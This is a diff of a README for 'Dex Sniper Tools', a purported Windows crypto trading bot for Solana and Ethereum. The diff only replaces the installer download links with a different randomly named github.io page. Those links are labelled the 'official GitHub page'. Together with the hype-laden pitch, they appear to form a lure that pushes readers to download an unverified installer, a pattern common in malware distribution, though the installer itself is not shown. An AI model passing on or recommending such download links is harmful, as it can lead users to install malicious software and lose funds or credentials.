@@ -2,7 +2,7 @@
 
 Dex Sniper Tools is a comprehensive Windows desktop application designed for advanced trading on decentralized exchanges in 2026. This automated DEX trading suite offers a range of features to help traders execute fast and efficient transactions across multiple blockchains, including Solana and Ethereum. Whether you're a beginner or an experienced trader, Dex Sniper Tools provides the tools needed to optimize your strategies and stay ahead in the dynamic crypto market.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -63,7 +63,7 @@ Connectivity problems can often be resolved by checking your internet connection
 
 To get started with Dex Sniper Tools and experience its advanced trading capabilities, download the latest version from the official GitHub page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
